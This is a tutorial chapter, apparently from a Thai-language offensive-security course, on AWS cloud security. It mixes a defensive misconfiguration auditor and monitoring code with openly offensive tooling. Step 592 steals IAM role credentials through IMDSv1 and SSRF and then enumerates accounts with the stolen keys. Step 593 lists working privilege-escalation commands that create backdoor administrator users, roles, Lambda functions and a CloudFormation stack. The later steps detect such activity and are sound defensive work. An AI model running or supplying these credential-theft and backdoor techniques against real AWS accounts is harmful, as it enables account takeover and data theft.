# Part 60: Cloud Security - AWS (Steps 591-600)

## Step 591: AWS Reconnaissance & Enumeration

AWS cloud security testing เริ่มด้วยการ enumerate services และค้นหา misconfiguration

```python
import boto3
import json
from botocore.exceptions import ClientError, NoCredentialsError
from dataclasses import dataclass, field
from typing import List, Dict, Optional

@dataclass
class AWSFinding:
    severity: str
    service: str
    resource: str
    issue: str
    remediation: str
    region: str = "global"

class AWSSecurityAuditor:
    def __init__(self, profile: str = None, region: str = "us-east-1"):
        session_kwargs = {"region_name": region}
        if profile:
            session_kwargs["profile_name"] = profile
        
        self.session = boto3.Session(**session_kwargs)
        self.region = region
        self.findings: List[AWSFinding] = []
    
    def get_account_info(self) -> dict:
        """Get basic account information"""
        try:
            sts = self.session.client('sts')
            identity = sts.get_caller_identity()
            
            return {
                "account_id": identity['Account'],
                "user_id": identity['UserId'],
                "arn": identity['Arn'],
                "is_root": 'root' in identity['Arn'].lower()
            }
        except NoCredentialsError:
            return {"error": "No credentials found"}
        except ClientError as e:
            return {"error": str(e)}
    
    def enumerate_iam(self) -> dict:
        """Enumerate IAM users, roles, and policies"""
        iam = self.session.client('iam')
        results = {"users": [], "roles": [], "policies": [], "groups": []}
        
        try:
            # List users
            paginator = iam.get_paginator('list_users')
            for page in paginator.paginate():
                for user in page['Users']:
                    user_data = {
                        "name": user['UserName'],
                        "arn": user['Arn'],
                        "created": str(user['CreateDate']),
                        "password_last_used": str(user.get('PasswordLastUsed', 'Never')),
                        "access_keys": [],
                        "mfa_enabled": False
                    }
                    
                    # Check access keys
                    keys = iam.list_access_keys(UserName=user['UserName'])
                    for key in keys['AccessKeyMetadata']:
                        user_data["access_keys"].append({
                            "key_id": key['AccessKeyId'],
                            "status": key['Status'],
                            "created": str(key['CreateDate'])
                        })
                    
                    # Check MFA
                    mfa_devices = iam.list_mfa_devices(UserName=user['UserName'])
                    user_data["mfa_enabled"] = len(mfa_devices['MFADevices']) > 0
                    
                    if not user_data["mfa_enabled"]:
                        self.findings.append(AWSFinding(
                            severity="HIGH",
                            service="IAM",
                            resource=user['UserName'],
                            issue="MFA not enabled for IAM user",
                            remediation="Enable MFA for user"
                        ))
                    
                    results["users"].append(user_data)
            
            # List roles
            role_paginator = iam.get_paginator('list_roles')
            for page in role_paginator.paginate():
                for role in page['Roles']:
                    # Check for overly permissive trust policies
                    trust_policy = role['AssumeRolePolicyDocument']
                    trust_str = json.dumps(trust_policy)
                    
                    role_data = {
                        "name": role['RoleName'],
                        "arn": role['Arn'],
                        "trust_policy": trust_policy
                    }
                    
                    # Check if role can be assumed by anyone
                    if '*' in trust_str and 'Effect": "Allow"' in trust_str:
                        self.findings.append(AWSFinding(
                            severity="CRITICAL",
                            service="IAM",
                            resource=role['RoleName'],
                            issue="Role can be assumed by anyone (*)",
                            remediation="Restrict trust policy to specific principals"
                        ))
                    
                    results["roles"].append(role_data)
        
        except ClientError as e:
            results["error"] = str(e)
        
        return results
    
    def check_s3_buckets(self) -> List[dict]:
        """Check S3 buckets for public access and misconfigurations"""
        s3 = self.session.client('s3')
        bucket_issues = []
        
        try:
            buckets = s3.list_buckets()['Buckets']
            
            for bucket in buckets:
                name = bucket['Name']
                issues = []
                
                # Check public access block
                try:
                    pab = s3.get_public_access_block(Bucket=name)
                    config = pab['PublicAccessBlockConfiguration']
                    
                    if not all([
                        config.get('BlockPublicAcls'),
                        config.get('BlockPublicPolicy'),
                        config.get('IgnorePublicAcls'),
                        config.get('RestrictPublicBuckets')
                    ]):
                        issues.append("Public access not fully blocked")
                except ClientError:
                    issues.append("No public access block configured")
                
                # Check bucket ACL
                try:
                    acl = s3.get_bucket_acl(Bucket=name)
                    for grant in acl['Grants']:
                        grantee = grant.get('Grantee', {})
                        if grantee.get('URI') == 'http://acs.amazonaws.com/groups/global/AllUsers':
                            issues.append("Bucket ACL grants access to all users (PUBLIC)")
                        elif grantee.get('URI') == 'http://acs.amazonaws.com/groups/global/AuthenticatedUsers':
                            issues.append("Bucket ACL grants access to all authenticated AWS users")
                except ClientError:
                    pass
                
                # Check bucket encryption
                try:
                    s3.get_bucket_encryption(Bucket=name)
                except ClientError:
                    issues.append("Bucket encryption not configured")
                
                # Check versioning
                try:
                    versioning = s3.get_bucket_versioning(Bucket=name)
                    if versioning.get('Status') != 'Enabled':
                        issues.append("Versioning not enabled")
                except ClientError:
                    pass
                
                # Check logging
                try:
                    logging_config = s3.get_bucket_logging(Bucket=name)
                    if 'LoggingEnabled' not in logging_config:
                        issues.append("Bucket logging not enabled")
                except ClientError:
                    pass
                
                if issues:
                    for issue in issues:
                        sev = "CRITICAL" if "PUBLIC" in issue.upper() else "MEDIUM"
                        self.findings.append(AWSFinding(
                            severity=sev,
                            service="S3",
                            resource=name,
                            issue=issue,
                            remediation="Review bucket policy and access controls"
                        ))
                    
                    bucket_issues.append({"bucket": name, "issues": issues})
        
        except ClientError as e:
            bucket_issues.append({"error": str(e)})
        
        return bucket_issues
    
    def check_security_groups(self) -> List[dict]:
        """Check EC2 security groups for dangerous rules"""
        ec2 = self.session.client('ec2', region_name=self.region)
        sg_issues = []
        
        try:
            sgs = ec2.describe_security_groups()['SecurityGroups']
            
            dangerous_ports = [22, 3389, 1433, 3306, 5432, 6379, 27017, 9200, 5601]
            
            for sg in sgs:
                issues = []
                sg_id = sg['GroupId']
                sg_name = sg.get('GroupName', sg_id)
                
                for rule in sg.get('IpPermissions', []):
                    from_port = rule.get('FromPort', 0)
                    to_port = rule.get('ToPort', 65535)
                    
                    for ip_range in rule.get('IpRanges', []):
                        if ip_range.get('CidrIp') == '0.0.0.0/0':
                            if from_port in dangerous_ports:
                                issues.append(f"Port {from_port} open to 0.0.0.0/0")
                            elif from_port == 0 and to_port == 0:  # All traffic
                                issues.append("All traffic allowed from 0.0.0.0/0")
                    
                    for ipv6_range in rule.get('Ipv6Ranges', []):
                        if ipv6_range.get('CidrIpv6') == '::/0':
                            if from_port in dangerous_ports:
                                issues.append(f"Port {from_port} open to ::/0 (IPv6)")
                
                if issues:
                    sg_issues.append({"sg_id": sg_id, "sg_name": sg_name, "issues": issues})
                    for issue in issues:
                        self.findings.append(AWSFinding(
                            severity="HIGH",
                            service="EC2",
                            resource=sg_id,
                            issue=issue,
                            remediation="Restrict security group rules to specific IPs",
                            region=self.region
                        ))
        
        except ClientError as e:
            sg_issues.append({"error": str(e)})
        
        return sg_issues
    
    def check_cloudtrail(self) -> dict:
        """Check CloudTrail configuration"""
        ct = self.session.client('cloudtrail', region_name=self.region)
        
        try:
            trails = ct.describe_trails()['trailList']
            
            issues = []
            trail_details = []
            
            for trail in trails:
                trail_name = trail['Name']
                is_multi_region = trail.get('IsMultiRegionTrail', False)
                has_log_validation = trail.get('LogFileValidationEnabled', False)
                
                status = ct.get_trail_status(Name=trail_name)
                is_logging = status.get('IsLogging', False)
                
                detail = {
                    "name": trail_name,
                    "multi_region": is_multi_region,
                    "log_validation": has_log_validation,
                    "is_logging": is_logging
                }
                trail_details.append(detail)
                
                if not is_logging:
                    issues.append(f"Trail {trail_name} is not logging")
                if not is_multi_region:
                    issues.append(f"Trail {trail_name} is not multi-region")
                if not has_log_validation:
                    issues.append(f"Trail {trail_name} has no log file validation")
            
            if not trails:
                issues.append("No CloudTrail trails configured")
                self.findings.append(AWSFinding(
                    severity="CRITICAL",
                    service="CloudTrail",
                    resource="account",
                    issue="CloudTrail not configured",
                    remediation="Enable CloudTrail for all regions"
                ))
            
            return {"trails": trail_details, "issues": issues}
        
        except ClientError as e:
            return {"error": str(e)}
    
    def check_rds_security(self) -> List[dict]:
        """Check RDS instances for security misconfigurations"""
        rds = self.session.client('rds', region_name=self.region)
        rds_issues = []
        
        try:
            instances = rds.describe_db_instances()['DBInstances']
            
            for db in instances:
                db_id = db['DBInstanceIdentifier']
                issues = []
                
                if db.get('PubliclyAccessible'):
                    issues.append("Database is publicly accessible")
                
                if not db.get('StorageEncrypted'):
                    issues.append("Storage encryption not enabled")
                
                if not db.get('DeletionProtection'):
                    issues.append("Deletion protection not enabled")
                
                if db.get('BackupRetentionPeriod', 0) == 0:
                    issues.append("Automated backups not configured")
                
                if not db.get('MultiAZ'):
                    issues.append("Multi-AZ not enabled")
                
                if issues:
                    rds_issues.append({"db": db_id, "issues": issues})
                    for issue in issues:
                        sev = "CRITICAL" if "publicly accessible" in issue.lower() else "MEDIUM"
                        self.findings.append(AWSFinding(
                            severity=sev,
                            service="RDS",
                            resource=db_id,
                            issue=issue,
                            remediation="Review RDS security configuration",
                            region=self.region
                        ))
        
        except ClientError as e:
            rds_issues.append({"error": str(e)})
        
        return rds_issues

if __name__ == '__main__':
    auditor = AWSSecurityAuditor()
    
    # Get account info
    account = auditor.get_account_info()
    print(f"[*] Account: {account}")
    
    # Run checks
    print("\n[*] Checking S3 buckets...")
    s3_issues = auditor.check_s3_buckets()
    
    print("\n[*] Checking security groups...")
    sg_issues = auditor.check_security_groups()
    
    print("\n[*] Checking CloudTrail...")
    ct_status = auditor.check_cloudtrail()
    
    print(f"\n[+] Total findings: {len(auditor.findings)}")
    for finding in sorted(auditor.findings, key=lambda x: x.severity):
        print(f"  [{finding.severity}] {finding.service}/{finding.resource}: {finding.issue}")
```

## Step 592: AWS Credential Attacks

เทคนิคการโจมตี AWS credentials

```python
import boto3
import json
import requests
from botocore.exceptions import ClientError
from typing import List, Dict

class AWSCredentialAttacker:
    def check_imds_access(self) -> dict:
        """Check IMDSv1 access from EC2 instance (SSRF vector)"""
        imds_url = "http://169.254.169.254/latest"
        
        try:
            # IMDSv1 - no token required (deprecated but still common)
            r = requests.get(f"{imds_url}/meta-data/", timeout=2)
            
            if r.status_code == 200:
                metadata = {}
                
                # Get credentials
                role_r = requests.get(f"{imds_url}/meta-data/iam/security-credentials/", timeout=2)
                if role_r.status_code == 200:
                    role_name = role_r.text.strip()
                    creds_r = requests.get(
                        f"{imds_url}/meta-data/iam/security-credentials/{role_name}",
                        timeout=2
                    )
                    if creds_r.status_code == 200:
                        creds = creds_r.json()
                        metadata['role'] = role_name
                        metadata['access_key'] = creds.get('AccessKeyId')
                        metadata['secret_key'] = creds.get('SecretAccessKey')
                        metadata['token'] = creds.get('Token')
                        metadata['expiration'] = creds.get('Expiration')
                        
                        print(f"[+] Got IAM role credentials from IMDS!")
                        print(f"[+] Role: {role_name}")
                        print(f"[+] Access Key: {metadata['access_key']}")
                
                # Get instance info
                for key in ['public-ipv4', 'local-ipv4', 'instance-id', 'instance-type', 'region']:
                    key_r = requests.get(f"{imds_url}/meta-data/{key}", timeout=2)
                    if key_r.status_code == 200:
                        metadata[key] = key_r.text
                
                return metadata
        
        except requests.exceptions.ConnectTimeout:
            return {"error": "Not on EC2 instance or IMDS not accessible"}
        except Exception as e:
            return {"error": str(e)}
    
    def exploit_ssrf_for_imds(self, ssrf_url: str) -> dict:
        """Exploit SSRF to reach IMDS"""
        imds_endpoints = [
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/meta-data/hostname",
            "http://169.254.169.254/latest/user-data",
            # IPv6
            "http://[fd00:ec2::254]/latest/meta-data/",
            # AWS-specific
            "http://169.254.169.254/latest/dynamic/instance-identity/document"
        ]
        
        results = {}
        for endpoint in imds_endpoints:
            # Inject IMDS URL into SSRF parameter
            test_url = f"{ssrf_url}?url={endpoint}"
            
            try:
                r = requests.get(test_url, timeout=5)
                if r.status_code == 200 and r.text:
                    results[endpoint] = r.text[:200]
            except:
                pass
        
        return results
    
    def enumerate_with_stolen_creds(self, access_key: str, 
                                     secret_key: str, 
                                     session_token: str = None) -> dict:
        """Enumerate AWS with stolen credentials"""
        session_kwargs = {
            "aws_access_key_id": access_key,
            "aws_secret_access_key": secret_key
        }
        if session_token:
            session_kwargs["aws_session_token"] = session_token
        
        session = boto3.Session(**session_kwargs)
        
        results = {}
        
        # Get caller identity
        try:
            sts = session.client('sts', region_name='us-east-1')
            identity = sts.get_caller_identity()
            results['identity'] = {
                "account": identity['Account'],
                "arn": identity['Arn'],
                "user_id": identity['UserId']
            }
            print(f"[+] Valid credentials! ARN: {identity['Arn']}")
        except ClientError as e:
            results['error'] = str(e)
            return results
        
        # Try to enumerate services
        services_to_check = [
            ('s3', 'list_buckets', {}),
            ('iam', 'list_users', {}),
            ('ec2', 'describe_instances', {'MaxResults': 10}),
            ('lambda', 'list_functions', {}),
            ('rds', 'describe_db_instances', {}),
            ('secretsmanager', 'list_secrets', {}),
        ]
        
        for service, method, kwargs in services_to_check:
            try:
                client = session.client(service, region_name='us-east-1')
                response = getattr(client, method)(**kwargs)
                
                # Count resources
                if service == 's3':
                    results['s3_buckets'] = len(response.get('Buckets', []))
                elif service == 'iam':
                    results['iam_users'] = len(response.get('Users', []))
                elif service == 'ec2':
                    instances = sum(len(r['Instances']) for r in response.get('Reservations', []))
                    results['ec2_instances'] = instances
                elif service == 'lambda':
                    results['lambda_functions'] = len(response.get('Functions', []))
                elif service == 'secretsmanager':
                    results['secrets'] = [s['Name'] for s in response.get('SecretList', [])]
                    
            except ClientError as e:
                error_code = e.response['Error']['Code']
                results[f'{service}_error'] = error_code
        
        return results
    
    def find_public_s3_objects(self, bucket: str) -> List[str]:
        """List accessible objects in public S3 bucket"""
        public_objects = []
        
        try:
            s3 = boto3.client('s3', region_name='us-east-1')
            
            paginator = s3.get_paginator('list_objects_v2')
            for page in paginator.paginate(Bucket=bucket):
                for obj in page.get('Contents', []):
                    key = obj['Key']
                    size = obj['Size']
                    
                    # Check if object is accessible
                    url = f"https://{bucket}.s3.amazonaws.com/{key}"
                    r = requests.head(url, timeout=5)
                    
                    if r.status_code == 200:
                        public_objects.append({
                            "key": key,
                            "size": size,
                            "url": url,
                            "content_type": r.headers.get('Content-Type', '')
                        })
                        print(f"[+] Public object: {url}")
        
        except ClientError as e:
            print(f"[-] Error: {e}")
        
        return public_objects
    
    def read_secret_from_secrets_manager(self, secret_name: str, 
                                          region: str = "us-east-1") -> dict:
        """Read AWS Secrets Manager secret"""
        sm = boto3.client('secretsmanager', region_name=region)
        
        try:
            response = sm.get_secret_value(SecretId=secret_name)
            
            if 'SecretString' in response:
                secret = response['SecretString']
                try:
                    return json.loads(secret)
                except json.JSONDecodeError:
                    return {"secret": secret}
            else:
                import base64
                return {"secret": base64.b64decode(response['SecretBinary'])}
        
        except ClientError as e:
            return {"error": str(e)}

if __name__ == '__main__':
    attacker = AWSCredentialAttacker()
    
    # Check IMDS (only works on EC2)
    print("[*] Checking IMDS...")
    imds_data = attacker.check_imds_access()
    
    if 'access_key' in imds_data:
        print(f"[+] Found credentials via IMDS!")
        
        # Enumerate with stolen creds
        enum_results = attacker.enumerate_with_stolen_creds(
            imds_data['access_key'],
            imds_data['secret_key'],
            imds_data.get('token')
        )
        print(f"[+] Enumeration results: {json.dumps(enum_results, indent=2)}")
    else:
        print(f"[-] IMDS result: {imds_data}")
```

## Step 593: AWS Privilege Escalation Techniques

เทคนิค privilege escalation บน AWS IAM

```python
import boto3
from botocore.exceptions import ClientError
from typing import List, Dict

class AWSPrivilegeEscalation:
    def __init__(self, session: boto3.Session):
        self.session = session
        self.iam = session.client('iam')
        self.sts = session.client('sts')
    
    def get_current_permissions(self) -> dict:
        """Get current user/role permissions"""
        identity = self.sts.get_caller_identity()
        arn = identity['Arn']
        
        permissions = {
            "arn": arn,
            "policies": [],
            "permissions": []
        }
        
        # If IAM user
        if ':user/' in arn:
            username = arn.split('/')[-1]
            
            # Get attached policies
            try:
                policies = self.iam.list_attached_user_policies(UserName=username)
                for policy in policies['AttachedPolicies']:
                    permissions['policies'].append(policy['PolicyName'])
                    
                    # Get policy version
                    policy_detail = self.iam.get_policy(PolicyArn=policy['PolicyArn'])
                    version = policy_detail['Policy']['DefaultVersionId']
                    
                    policy_doc = self.iam.get_policy_version(
                        PolicyArn=policy['PolicyArn'],
                        VersionId=version
                    )
                    
                    for statement in policy_doc['PolicyVersion']['Document'].get('Statement', []):
                        if statement.get('Effect') == 'Allow':
                            permissions['permissions'].extend(
                                statement.get('Action', [])
                                if isinstance(statement.get('Action'), list)
                                else [statement.get('Action', '')]
                            )
            except ClientError:
                pass
        
        return permissions
    
    def find_privesc_paths(self, permissions: List[str]) -> List[dict]:
        """Find privilege escalation paths based on current permissions"""
        privesc_techniques = []
        
        # Technique 1: Create new admin user
        if 'iam:CreateUser' in permissions and 'iam:AttachUserPolicy' in permissions:
            privesc_techniques.append({
                "technique": "Create Admin User",
                "required_permissions": ["iam:CreateUser", "iam:AttachUserPolicy"],
                "exploit": """
aws iam create-user --user-name backdoor-admin
aws iam attach-user-policy \\
  --user-name backdoor-admin \\
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backdoor-admin
                """
            })
        
        # Technique 2: Create admin role and assume it
        if 'iam:CreateRole' in permissions and 'iam:AttachRolePolicy' in permissions:
            privesc_techniques.append({
                "technique": "Create Admin Role",
                "required_permissions": ["iam:CreateRole", "iam:AttachRolePolicy", "sts:AssumeRole"],
                "exploit": """
aws iam create-role \\
  --role-name backdoor-role \\
  --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::ACCOUNT_ID:root"},"Action":"sts:AssumeRole"}]}'
aws iam attach-role-policy \\
  --role-name backdoor-role \\
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT_ID:role/backdoor-role --role-session-name admin
                """
            })
        
        # Technique 3: Update trust policy of existing admin role
        if 'iam:UpdateAssumeRolePolicy' in permissions:
            privesc_techniques.append({
                "technique": "Modify Trust Policy",
                "required_permissions": ["iam:UpdateAssumeRolePolicy"],
                "exploit": """
# Modify existing role to allow our user to assume it
aws iam update-assume-role-policy \\
  --role-name AdminRole \\
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::ACCOUNT_ID:user/low-priv-user"},"Action":"sts:AssumeRole"}]}'
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT_ID:role/AdminRole --role-session-name escalated
                """
            })
        
        # Technique 4: Lambda execution with admin role
        if 'lambda:CreateFunction' in permissions and 'lambda:InvokeFunction' in permissions:
            privesc_techniques.append({
                "technique": "Lambda Privilege Escalation",
                "required_permissions": ["lambda:CreateFunction", "lambda:InvokeFunction", "iam:PassRole"],
                "exploit": """
# Create Lambda with admin role
cat > /tmp/privesc.py << 'EOF'
import boto3
def handler(event, context):
    iam = boto3.client('iam')
    # Execute with Lambda's role permissions
    user = iam.create_user(UserName='backdoor')
    iam.attach_user_policy(
        UserName='backdoor',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    key = iam.create_access_key(UserName='backdoor')
    return key['AccessKey']
EOF

zip /tmp/privesc.zip /tmp/privesc.py
aws lambda create-function \\
  --function-name privesc \\
  --runtime python3.9 \\
  --handler privesc.handler \\
  --role arn:aws:iam::ACCOUNT_ID:role/LambdaAdminRole \\
  --zip-file fileb:///tmp/privesc.zip
aws lambda invoke --function-name privesc /tmp/output.json
cat /tmp/output.json
                """
            })
        
        # Technique 5: EC2 instance with admin role
        if 'ec2:RunInstances' in permissions and 'iam:PassRole' in permissions:
            privesc_techniques.append({
                "technique": "EC2 Instance with Admin Profile",
                "required_permissions": ["ec2:RunInstances", "iam:PassRole"],
                "exploit": """
# Launch EC2 with admin instance profile, access via IMDS
aws ec2 run-instances \\
  --image-id ami-0c55b159cbfafe1f0 \\
  --instance-type t2.micro \\
  --iam-instance-profile Name=AdminInstanceProfile \\
  --user-data '#!/bin/bash\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/ > /tmp/role\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/$(cat /tmp/role) > /tmp/creds'
                """
            })
        
        return privesc_techniques
    
    def cloudformation_privesc(self, template_bucket: str) -> str:
        """CloudFormation privilege escalation"""
        return """
# If cloudformation:CreateStack + iam:PassRole permission
# Create stack with admin role that creates a backdoor user

cat > /tmp/privesc_template.json << 'EOF'
{
  "AWSTemplateFormatVersion": "2010-09-09",
  "Resources": {
    "BackdoorUser": {
      "Type": "AWS::IAM::User",
      "Properties": {"UserName": "cfn-backdoor"}
    },
    "AdminPolicy": {
      "Type": "AWS::IAM::Policy",
      "Properties": {
        "PolicyName": "AdminPolicy",
        "PolicyDocument": {
          "Version": "2012-10-17",
          "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
        },
        "Users": [{"Ref": "BackdoorUser"}]
      }
    },
    "BackdoorKey": {
      "Type": "AWS::IAM::AccessKey",
      "Properties": {"UserName": {"Ref": "BackdoorUser"}}
    }
  },
  "Outputs": {
    "AccessKey": {"Value": {"Ref": "BackdoorKey"}},
    "SecretKey": {"Value": {"Fn::GetAtt": ["BackdoorKey", "SecretAccessKey"]}}
  }
}
EOF

aws cloudformation create-stack \\
  --stack-name privesc-stack \\
  --template-body file:///tmp/privesc_template.json \\
  --capabilities CAPABILITY_NAMED_IAM \\
  --role-arn arn:aws:iam::ACCOUNT_ID:role/CFNAdminRole

aws cloudformation describe-stacks --stack-name privesc-stack \\
  --query 'Stacks[0].Outputs'
        """

if __name__ == '__main__':
    print("[*] AWS Privilege Escalation Techniques")
    
    # Create auditor with current credentials
    session = boto3.Session()
    privesc = AWSPrivilegeEscalation(session)
    
    try:
        perms = privesc.get_current_permissions()
        print(f"[*] Current ARN: {perms['arn']}")
        print(f"[*] Policies: {perms['policies']}")
        
        paths = privesc.find_privesc_paths(perms['permissions'])
        print(f"[+] Found {len(paths)} privilege escalation paths:")
        for path in paths:
            print(f"  - {path['technique']}: requires {path['required_permissions']}")
    except Exception as e:
        print(f"[-] Error: {e}")
```

## Step 594-600: AWS Security Automation & Monitoring

```python
import boto3
import json
from datetime import datetime, timedelta
from typing import List, Dict
import hashlib

class AWSSecurityMonitor:
    def __init__(self, region: str = "us-east-1"):
        self.region = region
        self.session = boto3.Session(region_name=region)
    
    def detect_credential_leaks(self) -> List[dict]:
        """Use GuardDuty to detect unusual API activity"""
        gd = self.session.client('guardduty')
        findings = []
        
        try:
            detectors = gd.list_detectors()['DetectorIds']
            
            for detector_id in detectors:
                finding_ids = gd.list_findings(
                    DetectorId=detector_id,
                    FindingCriteria={
                        "Criterion": {
                            "severity": {"Gte": 7}  # HIGH and CRITICAL only
                        }
                    }
                )['FindingIds']
                
                if finding_ids:
                    gd_findings = gd.get_findings(
                        DetectorId=detector_id,
                        FindingIds=finding_ids[:50]
                    )['Findings']
                    
                    for f in gd_findings:
                        findings.append({
                            "id": f['Id'],
                            "type": f['Type'],
                            "severity": f['Severity'],
                            "title": f['Title'],
                            "description": f['Description'][:200],
                            "region": f['Region'],
                            "account_id": f['AccountId'],
                            "updated": f['UpdatedAt']
                        })
        except Exception as e:
            findings.append({"error": str(e)})
        
        return findings
    
    def analyze_cloudtrail_logs(self, hours_back: int = 24) -> List[dict]:
        """Analyze CloudTrail for suspicious activity"""
        ct = self.session.client('cloudtrail')
        
        end_time = datetime.utcnow()
        start_time = end_time - timedelta(hours=hours_back)
        
        suspicious_events = []
        
        # Events that indicate potential compromise
        high_risk_events = [
            "ConsoleLogin",
            "CreateUser",
            "CreateAccessKey",
            "AttachUserPolicy",
            "PutRolePolicy",
            "CreateRole",
            "AssumeRole",
            "GetSecretValue",
            "RunInstances",
            "CreateBucket",
            "DeleteBucket",
            "DeleteTrail",
            "StopLogging",
            "UpdateTrail"
        ]
        
        try:
            paginator = ct.get_paginator('lookup_events')
            
            for page in paginator.paginate(
                StartTime=start_time,
                EndTime=end_time,
                LookupAttributes=[]
            ):
                for event in page['Events']:
                    event_name = event.get('EventName')
                    
                    if event_name in high_risk_events:
                        cloud_trail_event = json.loads(event.get('CloudTrailEvent', '{}'))
                        
                        suspicious_events.append({
                            "event": event_name,
                            "user": event.get('Username', 'unknown'),
                            "time": str(event.get('EventTime')),
                            "source_ip": cloud_trail_event.get('sourceIPAddress', 'unknown'),
                            "user_agent": cloud_trail_event.get('userAgent', ''),
                            "resources": [r.get('ResourceName') for r in event.get('Resources', [])]
                        })
        
        except Exception as e:
            suspicious_events.append({"error": str(e)})
        
        return suspicious_events
    
    def check_security_hub_findings(self) -> dict:
        """Get Security Hub compliance findings"""
        sh = self.session.client('securityhub')
        
        try:
            # Get CRITICAL and HIGH findings
            response = sh.get_findings(
                Filters={
                    "SeverityLabel": [
                        {"Value": "CRITICAL", "Comparison": "EQUALS"},
                        {"Value": "HIGH", "Comparison": "EQUALS"}
                    ],
                    "RecordState": [{"Value": "ACTIVE", "Comparison": "EQUALS"}],
                    "WorkflowStatus": [{"Value": "NEW", "Comparison": "EQUALS"}]
                },
                MaxResults=100
            )
            
            findings_by_type = {}
            for finding in response.get('Findings', []):
                title = finding.get('Title', 'Unknown')
                severity = finding.get('Severity', {}).get('Label', 'UNKNOWN')
                
                if title not in findings_by_type:
                    findings_by_type[title] = {"severity": severity, "count": 0, "resources": []}
                
                findings_by_type[title]["count"] += 1
                for r in finding.get('Resources', []):
                    findings_by_type[title]["resources"].append(r.get('Id', ''))
            
            return {
                "total_findings": len(response.get('Findings', [])),
                "findings_by_type": findings_by_type
            }
        
        except Exception as e:
            return {"error": str(e)}
    
    def create_security_event_response_lambda(self) -> str:
        """Lambda function for automated security response"""
        return """
import boto3
import json
from datetime import datetime

def handler(event, context):
    # Triggered by GuardDuty finding via EventBridge
    finding = event.get('detail', {}).get('findings', [{}])[0]
    
    finding_type = finding.get('type', '')
    severity = finding.get('severity', 0)
    
    actions_taken = []
    
    # High severity: isolate affected resource
    if severity >= 7:
        resource = finding.get('resource', {})
        
        # EC2 instance - isolate by modifying security group
        if resource.get('resourceType') == 'Instance':
            instance_id = resource.get('instanceDetails', {}).get('instanceId')
            ec2 = boto3.client('ec2')
            
            # Create isolation security group
            try:
                sg = ec2.create_security_group(
                    GroupName=f'ISOLATED-{instance_id}-{datetime.now().strftime("%Y%m%d%H%M%S")}',
                    Description='Isolation SG - Security Incident',
                    VpcId=resource.get('instanceDetails', {}).get('networkInterfaces', [{}])[0].get('vpcId')
                )
                sg_id = sg['GroupId']
                
                # Modify instance security groups
                ec2.modify_instance_attribute(
                    InstanceId=instance_id,
                    Groups=[sg_id]
                )
                
                actions_taken.append(f'Isolated {instance_id} to {sg_id}')
            except Exception as e:
                actions_taken.append(f'Failed to isolate: {e}')
        
        # IAM user - disable access keys
        if 'UnauthorizedAccess' in finding_type or 'CredentialAccess' in finding_type:
            iam = boto3.client('iam')
            principal = finding.get('service', {}).get('action', {}).get('awsApiCallAction', {}).get('remoteIpDetails', {})
            
            user_arn = finding.get('resource', {}).get('accessKeyDetails', {}).get('userName')
            access_key_id = finding.get('resource', {}).get('accessKeyDetails', {}).get('accessKeyId')
            
            if user_arn and access_key_id:
                try:
                    iam.update_access_key(
                        UserName=user_arn,
                        AccessKeyId=access_key_id,
                        Status='Inactive'
                    )
                    actions_taken.append(f'Disabled access key {access_key_id} for {user_arn}')
                except Exception as e:
                    actions_taken.append(f'Failed to disable key: {e}')
    
    # Notify via SNS
    sns = boto3.client('sns')
    sns.publish(
        TopicArn='arn:aws:sns:REGION:ACCOUNT:SecurityAlerts',
        Subject=f'Security Alert: {finding_type}',
        Message=json.dumps({'finding': finding, 'actions': actions_taken}, default=str)
    )
    
    return {'statusCode': 200, 'actions': actions_taken}
        """
    
    def generate_aws_security_report(self) -> dict:
        """Generate comprehensive AWS security posture report"""
        print("[*] Generating AWS Security Report...")
        
        report = {
            "timestamp": datetime.utcnow().isoformat(),
            "region": self.region,
            "sections": {}
        }
        
        # GuardDuty
        print("  [*] Checking GuardDuty...")
        report["sections"]["guardduty"] = self.detect_credential_leaks()
        
        # CloudTrail
        print("  [*] Analyzing CloudTrail...")
        report["sections"]["suspicious_events"] = self.analyze_cloudtrail_logs(24)
        
        # Security Hub
        print("  [*] Checking Security Hub...")
        report["sections"]["security_hub"] = self.check_security_hub_findings()
        
        # Summary
        total_gd_findings = len([f for f in report["sections"]["guardduty"] if "error" not in f])
        total_suspicious = len([e for e in report["sections"]["suspicious_events"] if "error" not in e])
        sh_total = report["sections"]["security_hub"].get("total_findings", 0)
        
        report["summary"] = {
            "guardduty_findings": total_gd_findings,
            "suspicious_cloudtrail_events": total_suspicious,
            "security_hub_findings": sh_total,
            "risk_level": "CRITICAL" if total_gd_findings > 5 else "HIGH" if total_gd_findings > 0 else "MEDIUM"
        }
        
        return report

if __name__ == '__main__':
    monitor = AWSSecurityMonitor()
    
    print("[*] AWS Security Monitor")
    
    # Quick check
    print("\n[*] Detecting suspicious activity...")
    suspicious = monitor.analyze_cloudtrail_logs(hours_back=24)
    
    if suspicious:
        print(f"[!] Found {len(suspicious)} suspicious events in last 24 hours:")
        for event in suspicious[:5]:
            if 'error' not in event:
                print(f"  - {event['event']} by {event['user']} from {event['source_ip']}")
    else:
        print("[*] No suspicious events detected")
    
    # Full report
    # report = monitor.generate_aws_security_report()
    # print(json.dumps(report['summary'], indent=2))
```
